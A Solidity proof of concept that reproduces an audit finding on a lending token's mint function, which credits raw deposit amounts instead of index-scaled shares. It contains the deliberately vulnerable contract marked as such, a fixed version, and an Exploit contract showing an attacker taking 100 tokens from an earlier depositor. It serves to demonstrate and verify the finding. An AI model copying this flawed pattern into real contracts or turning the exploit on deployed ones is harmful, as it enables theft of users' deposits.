// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  RAAC RToken.mint (CodeHawks 2025-02, finding 57138)
    mint computes amountScaled = amount.rayDiv(index) and then mints amountToMint,
    the underlying amount, instead of the scaled share. After the liquidity index
    moves from 1e27 to 1.1e27, a 1000 deposit is credited as 1000 raw tokens.
    withdraw pays balance.rayMul(index) = 1100 and takes 100 from the earlier depositor.

    CREATE order inside Exploit:
      nonce 1 Token, 2 RToken, 3 Victim
*/

library Scale {
    uint256 internal constant RAY_UNIT = 1e27;

    function rayDiv(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * RAY_UNIT / b;
    }

    function rayMul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b / RAY_UNIT;
    }

    function toUint128(uint256 x) internal pure returns (uint128) {
        require(x <= type(uint128).max, "128");
        return uint128(x);
    }
}

using Scale for uint256;

contract Token {
    string public symbol = "USD";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract RToken {
    Token public underlying;
    uint256 public index = 1e27;
    uint256 public totalSupply;
    uint256 public lastBalanceIncrease;
    mapping(address => uint256) public balanceOf;
    mapping(address => uint128) public userIndex;
    error InvalidAmount();

    constructor(Token _underlying) {
        underlying = _underlying;
    }

    function accrueTo(uint256 nextIndex) external {
        index = nextIndex;
    }

    function seed(address user, uint256 amount) external {
        underlying.transferFrom(msg.sender, address(this), amount);
        balanceOf[user] += amount;
        totalSupply += amount;
        userIndex[user] = index.toUint128();
    }

    function deposit(uint256 amount) external {
        underlying.transferFrom(msg.sender, address(this), amount);
        mint(msg.sender, msg.sender, amount, index);
    }

    function mint(address caller, address onBehalfOf, uint256 amountToMint, uint256 index_)
        public
        returns (bool, uint256, uint256, uint256)
    {
        if (amountToMint == 0) {
            return (false, 0, 0, 0);
        }
        uint256 amountScaled = amountToMint.rayDiv(index_);
        if (amountScaled == 0) revert InvalidAmount();
        uint256 scaledBalance = balanceOf[onBehalfOf];
        bool isFirstMint = scaledBalance == 0;
        uint256 balanceIncrease = 0;
        if (userIndex[onBehalfOf] != 0 && userIndex[onBehalfOf] < index_) {
            balanceIncrease = scaledBalance.rayMul(index_) - scaledBalance.rayMul(userIndex[onBehalfOf]);
        }
        userIndex[onBehalfOf] = index_.toUint128();
        // @> VULN: mints amountToMint (underlying) instead of the scaled share amountScaled
        _mint(onBehalfOf, amountToMint.toUint128());
        lastBalanceIncrease = balanceIncrease;
        lastBalanceIncrease = caller == address(0) ? lastBalanceIncrease : balanceIncrease;
        return (isFirstMint, amountToMint, totalSupply, amountScaled);
    }

    function _mint(address to, uint128 amount) internal {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function preview(address user) external view returns (uint256) {
        return balanceOf[user].rayMul(index);
    }

    function withdraw() external returns (uint256 assets) {
        uint256 shares = balanceOf[msg.sender];
        assets = shares.rayMul(index);
        balanceOf[msg.sender] = 0;
        totalSupply -= shares;
        underlying.transfer(msg.sender, assets);
    }
}

contract RTokenFixed {
    Token public underlying;
    uint256 public index = 1e27;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    constructor(Token _underlying) {
        underlying = _underlying;
    }

    function accrueTo(uint256 nextIndex) external {
        index = nextIndex;
    }

    function deposit(uint256 amount) external {
        underlying.transferFrom(msg.sender, address(this), amount);
        uint256 amountScaled = amount.rayDiv(index);
        balanceOf[msg.sender] += amountScaled;
        totalSupply += amountScaled;
    }

    function withdraw() external returns (uint256 assets) {
        uint256 shares = balanceOf[msg.sender];
        assets = shares.rayMul(index);
        balanceOf[msg.sender] = 0;
        totalSupply -= shares;
        underlying.transfer(msg.sender, assets);
    }
}

contract Victim {
    function seed(RToken rt, Token token) external {
        uint256 amount = token.balanceOf(address(this));
        token.approve(address(rt), amount);
        rt.seed(address(this), amount);
    }

    function withdraw(RToken rt) external {
        rt.withdraw();
    }
}

contract Exploit {
    Token public token;
    RToken public rtoken;
    Victim public victim;
    uint256 public withdrawn;

    constructor() {
        token = new Token();
        rtoken = new RToken(token);
        victim = new Victim();
        token.mint(address(victim), 1000 ether);
        token.mint(address(this), 1000 ether);
    }

    function run() external {
        victim.seed(rtoken, token);
        require(rtoken.balanceOf(address(victim)) == 1000 ether, "alice shares");
        rtoken.accrueTo(11 * 10 ** 26);
        token.approve(address(rtoken), 1000 ether);
        rtoken.deposit(1000 ether);
        require(rtoken.balanceOf(address(this)) == 1000 ether, "raw mint");
        withdrawn = rtoken.withdraw();
        require(withdrawn == 1100 ether, "overpay");
        require(token.balanceOf(address(this)) == 1100 ether, "profit");
        require(token.balanceOf(address(rtoken)) == 900 ether, "left");
        (bool aliceOk,) = address(victim).call(abi.encodeWithSelector(victim.withdraw.selector, address(rtoken)));
        require(!aliceOk, "alice withdrew");
        require(token.balanceOf(address(rtoken)) == 900 ether, "alice principal short");
    }
}
